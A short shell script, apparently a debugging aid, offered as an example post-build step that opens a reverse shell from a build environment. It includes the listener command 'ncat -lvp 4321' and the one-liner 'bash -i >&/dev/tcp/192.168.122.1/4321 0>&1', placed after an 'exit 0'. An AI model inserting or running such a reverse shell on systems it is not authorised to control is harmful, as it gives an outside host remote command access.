# example post-build step;  pops a reverse shell in the build env
#
# replace the ip with one of your host IPs and start listening:
#   ncat -lvp 4321

exit 0

setup-interfaces -ar
bash -i >&/dev/tcp/192.168.122.1/4321 0>&1
